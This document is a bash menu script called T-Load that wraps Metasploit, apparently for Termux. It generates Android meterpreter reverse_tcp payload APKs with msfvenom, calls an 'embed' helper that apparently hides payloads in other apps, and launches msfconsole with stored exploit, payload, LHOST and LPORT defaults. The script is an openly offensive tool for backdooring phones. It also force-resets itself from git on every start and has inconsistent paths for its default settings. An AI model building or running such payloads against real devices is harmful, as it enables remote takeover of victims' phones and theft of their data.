###
source $HOME/T-Load/host
dir="$HOME/T-Load"
cd $dir
clear
echo "Updating Please Wait :)" 
update=$(git fetch --all
git reset --hard origin/master
git pull)
echo $update >> $HOME/T-Load/updatelog
chmod +x *
metapath="$HOME/metasploit-framework"
cd $HOME/T-Load
clear
if [ ${1} == "embed" ]
then 
./embed
fi
echo "----------------------------------"
echo "          Version = 7             "
echo "----------------------------------"
echo "      SCRIPT BY SATHVIK K S       "
echo " PLEASE MAKE SURE THAT THE CURRENT "
echo " PATH CONTAINS METASPLOIT FRAMEWOTK"
echo "----------------------------------"
echo "Select option"
echo "0. Install requirements ----->> Must do if this is first use"
echo "1. Create Payload"
echo "2. Embed Payload"
echo "3. Launch msfconsole normally"
echo "4. Exit"
echo "5. Set default metasploit exploit to be used"
echo "6. Set default metasploit payload to be used"
echo "7. Set default metasploit lhost  to be used"
echo "8. Set default metasploit lport to be used"
echo "9. Launch msfconsole with default values"
echo "10. Redownload"
read -p ">|" o
if [ $o = "0" ]
then
./setup
elif [ $o = "10" ]
then
./redownload
elif [ $o = "3" ]
then
clear
cd $metapath
./msfconsole
tload
elif [ $o = "2" ]
then
./embed
elif [ $o = "1" ]
then
clear
cd $metapath
echo "Enter HOST"
read -p ">|" host1
echo "Enter PORT"
read -p ">|" port1
echo "Please enter the complete path with .apk extension"
echo "where you want to save the payload to"
read -p ">|" p2
./msfvenom -p android/meterpreter/reverse_tcp LHOST=$host1 LPORT=$port1 R > $p2
cd ..
sleep 3
tload
elif [ $o = "4" ]
then
clear
exit
elif [ $o = "5" ]
then
rm $HOME/.msf_default/exploit
clear
echo "Enter exploit to be used"
read -p ">|" ex
echo "set exploit \"$ex\"" >> $HOME/.msf_default/exploit
echo "Value stored"
sleep 2
tload
elif [ $o = "6" ]
then
rm $HOME/T-Load/msf_default/payload
clear
echo "Enter payload to be used"
read -p ">|" py
echo "set payload \"$py\"" >> $HOME/.msf_default/payload
echo "Value stored"
sleep 2
tload
elif [ $o = "7" ]
then
rm $HOME/T-Load/msf_default/host
clear
echo "Enter lhost to be used"
read -p ">|" lh
echo "set lhostused \"$lh\"" >> $HOME/.msf_default/host
echo "Value stored"
sleep 2
tload
elif [ $o = "8" ]
then
rm $HOME/.msf_default/port
clear
echo "Enter lport to be used"
read -p ">|" lp
echo "set lportused \"$lp\"" >> $HOME/.msf_default/port
echo "Value stored"
sleep 2
tload
elif [ $o = "9" ]
then
[[ -s $HOME/.msf_default/exploit ]]
exp=$(echo $?)
[[ -s $HOME/.msf_default/payload ]]
pay=$(echo $?)
[[ -s $HOME/.msf_default/host ]]
hos=$(echo $?)
[[ -s $HOME/.msf_default/port ]]
por=$(echo $?)
if [ $exp = $pay ] && [ $hos = $por ] && [ $exp = $hos ] && [ $exp = "0" ]
then
clear
$HOME/.msf_default/msfload
else
clear
tload
echo "One or more of the default values have not been set. Please try again"
sleep 4
tload
fi
else
echo "Wrong choice. Please try again"
sleep 3
tload
fi
